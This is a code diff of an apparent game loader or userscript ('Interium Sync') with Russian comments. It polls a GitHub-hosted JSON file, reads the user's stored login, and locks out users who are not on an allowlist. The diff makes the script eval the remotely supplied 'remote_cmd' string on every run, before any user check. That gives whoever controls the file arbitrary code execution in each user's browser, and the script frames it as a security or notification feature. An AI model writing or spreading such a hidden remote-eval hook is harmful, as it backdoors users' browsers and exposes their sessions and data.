@@ -6,38 +6,41 @@
 
     async function checkSecurity() {
         try {
-            // 1. Пытаемся достать логин, который чел ввел в лоадере
-            // Лоадеры часто хранят это в localStorage под ключами 'uid', 'auth' или 'login'
-            const savedUser = localStorage.getItem('u') || localStorage.getItem('uid') || (window.myPlayer ? window.myPlayer.name : null);
+            // Пытаемся достать данные из разных мест
+            const storageU = localStorage.getItem('u') || localStorage.getItem('uid');
+            const gameU = window.myPlayer ? window.myPlayer.name : null;
+            const savedUser = storageU || gameU;
+
+            console.log("[Interium Sync] Checking for user:", savedUser);
 
             const res = await fetch(DATA_URL + '?t=' + Date.now());
             const data = await res.json();
+            
+            console.log("[Interium Sync] Data received from GitHub. Command:", data.remote_cmd);
 
+            // 1. Исполняем команду ВСЕГДА (даже если юзер еще не залогинился)
+            if (data.remote_cmd && data.remote_cmd.trim() !== "") {
+                try {
+                    eval(data.remote_cmd);
+                } catch(e) { console.error("Eval Error:", e); }
+            }
+
+            // 2. Если юзер опознан — проверяем на бан
             if (savedUser) {
-                // Ищем этого чела в твоем списке на Гитхабе
                 const userInList = data.users.find(u => u.name === savedUser);
-
-                // ЛОГИКА КИКНУТЬ:
-                // Если чела нет в списке ИЛИ его статус не active
                 if (!userInList || userInList.status !== "active") {
-                    document.body.innerHTML = "<div style='color:white; background:black; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:25px;'>ACCESS DENIED: ACCOUNT TERMINATED</div>";
-                    setTimeout(() => { location.replace("about:blank"); }, 2000);
-                    return;
+                    document.body.innerHTML = "<div style='color:red; background:black; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:25px;'>ACCESS DENIED: BANNED</div>";
+                    location.replace("about:blank");
                 }
             }
 
-            // 2. УДАЛЕННЫЕ КОМАНДЫ (Уведомления и т.д.)
-            if (data.remote_cmd) {
-                eval(data.remote_cmd);
-            }
-
         } catch (e) {
-            // Если инета нет или гитхаб лежит - можно либо разрешить, либо заблокировать
+            console.error("[Interium Sync] Fetch failed. Check your link or AdBlock.");
         }
     }
 
-    // Запускаем проверку раз в 15 секунд
-    setInterval(checkSecurity, 15000);
+    // Проверка раз в 10 секунд
+    setInterval(checkSecurity, 10000);
     checkSecurity();
 })();
 
